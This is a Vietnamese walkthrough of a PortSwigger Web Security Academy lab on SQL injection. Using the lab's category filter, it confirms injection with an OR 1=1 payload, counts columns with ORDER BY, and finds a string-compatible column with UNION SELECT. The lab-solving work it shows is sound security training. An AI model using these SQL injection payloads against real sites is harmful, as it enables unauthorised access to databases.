![Giao diện lab ban đầu](images/Pasted%20image%2020260530164015.png)
# Tổng quan về lab
Đầu tiên ta truy cập vào lab,dùng trang web như một client để web có chức năng gì khi bấm vào `Accessories` ta thấy ở URL:
```LINK
https://0ae7008404d7e75a80169f6b00e300f6.web-security-academy.net/filter?category=Accessories
```
Ta thấy có mùi SQLi ở `category=Accessories` vậy nếu ta thử `'+OR+1=1--` :
```LINK
https://0ae7008404d7e75a80169f6b00e300f6.web-security-academy.net/filter?category=Accessories'+OR+1=1--
```
![Thử payload OR 1=1](images/Pasted%20image%2020260530164446.png)
Và bùm.Ta thấy ngoài danh mục của Accessories ra đã hiện thêm sản phẩm ở các mục khác 
=> SQLi 100%
`Mục tiêu của lab`: sử dụng UNION ATTACK để giá trị string do lab cung cấp được hiện thị trong respone của lab
# Khai thác:
Đầu tiên,ta xác định số cột bằng cách dùng ORDER BY 1,2,3,..--:
```Link
https://0ae7008404d7e75a80169f6b00e300f6.web-security-academy.net/filter?category=Accessories%27+ORDER+BY+1--

https://0ae7008404d7e75a80169f6b00e300f6.web-security-academy.net/filter?category=Accessories%27+ORDER+BY+2--

https://0ae7008404d7e75a80169f6b00e300f6.web-security-academy.net/filter?category=Accessories%27+ORDER+BY+3--
```
nhưng khi đến ORDER BY 4--:
![ORDER BY 4 bị lỗi](images/Pasted%20image%2020260530165104.png)
=> UNION SELECT ta sẽ dùng 3 cột
`Tiếp theo` ta sẽ dùng payload:
```SQL
'+UNION+SELECT+'cDU3iV',NULL,NULL--
```
Kết quả lúc này:
![UNION SELECT chuỗi ở cột 1 bị lỗi](images/Pasted%20image%2020260530165359.png)
Nó vẫn bị lỗi server vì kiểu dữ liệu các cột k trùng khớp với nhau vậy ta chuyển chuỗi sang cột 2
```SQL
'+UNION+SELECT+NULL,'cDU3iV',NULL--
```
Kết quả lúc này:
![UNION SELECT chuỗi ở cột 2 thành công](images/Pasted%20image%2020260530165543.png)
=> chứng tỏ một điều cột thứ 2 ở query select đầu tiên thì là kiểu varchar nên việc query đến database thành công
=>solved
